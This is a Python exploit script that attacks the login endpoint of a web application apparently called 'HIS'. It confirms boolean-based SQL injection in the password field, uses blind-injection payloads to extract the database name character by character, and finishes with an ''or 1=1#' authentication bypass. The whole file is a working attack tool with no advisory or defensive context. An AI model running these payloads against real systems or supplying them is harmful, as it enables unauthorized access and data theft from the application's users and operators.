import requests, string, sys, warnings, time, concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

dbname = ''

req = requests.Session()

def login(ip,username,password):  
    target = "http://%s/HIS/includes/users/UsersController.php" %ip

    data = {'type':'login','username':username,'password':password}
    response = req.post(target, data=data)

    if 'success' in response.text:
        print("[$] Success Login with credentials "+username+":"+password+"")
    else:
        print("[$] Failed Login with credentials "+username+":"+password+"")

def check_injection():
    # library inj
    test_query0 = "'or 1=2#"
    test_query1 = "'or 1=1#"

    target = "http://%s/HIS/includes/users/UsersController.php" %ip

    result = ""

    for i in range(2):

        if i==0:
            data = {'type':'login','username':username,'password':test_query0}
            response = req.post(target, data=data)
            if response.text=="success":
                result = response.text
            else:
                pass
        if i==1:
            data = {'type':'login', 'username':username,'password':test_query1}
            response = req.post(target, data=data)
            if response.text=="success":
                result = response.text
            else:
                pass
    if result=="success":
        print("[##] SQLI Boolean-Based Present at password field :)")
    else:
        print("[##] No SQLI :)")

def brute(dbname):
    target = "http://%s/HIS/includes/users/UsersController.php" %ip

    l=0

    no = [int(a) for a in str(string.digits)]
    # checking length of dbname
    for i in no: # 0-9

        payload = "'or 1=1 and length(database())='"+ str(i) +"'#"
        #print(payload)
    
        data = {'type':'login','username':username,'password':payload}
        response = req.post(target, data=data)
        result = response.text

        if result=="success":
            print("[##] The correct length of DB name is "+str(i))
            l=i
            break
        else:
            print("[##] The length of DB name "+str(i)+" is wrong")
            pass

    char = [char for char in string.ascii_lowercase]
    dbname = []

    for i in range(l):
        for j in char:
            payload = "'or 1=1 and substring(database()," + str(i+1) + ",1)='" + str(j) +"'#"
            
            data = {'type':'login','username':username,'password':payload}
            response = req.post(target, data=data)
            result = response.text

            if result=="success":
                dbname.append(j)
                print("[+] The " + str(i+1) + " char of DB name is "+str(j))
                break
            else:
                pass

    dbname = ''.join(dbname)
    
    print("[+] Database name retrieved --> "+dbname)
    print("[+] Bypass completed :)")
    print("[+] Bypass payload can be used is \n'or 1=1#")

    password = "'or 1=1#"
    print("\nRetry to login with new payload in password field")
    login(ip,username,password)

if __name__ == "__main__":
    print("   _____       _ __                                   ")
    print("  / ___/____ _(_) /_____ _____ ___  ____ _____  ____ _")
    print("  \__ \/ __ `/ / __/ __ `/ __ `__ \/ __ `/ __ \/ __ `/")
    print(" ___/ / /_/ / / /_/ /_/ / / / / / / /_/ / / / / /_/ / ")
    print("/____/\__,_/_/\__/\__,_/_/ /_/ /_/\__,_/_/ /_/\__, /  ")
    print("                                             /____/   \n\n")

    try:
        ip = sys.argv[1].strip()
        username = sys.argv[2].strip()
        password = sys.argv[3].strip()

        login(ip,username,password)
        check_injection()
        brute(dbname)
        
    except IndexError:
        print("[-] Usage %s <ip> <username> <password>" % sys.argv[0])
        print("[-] Example: %s 192.168.100.x admin admin123" % sys.argv[0])
    sys.exit(-1)
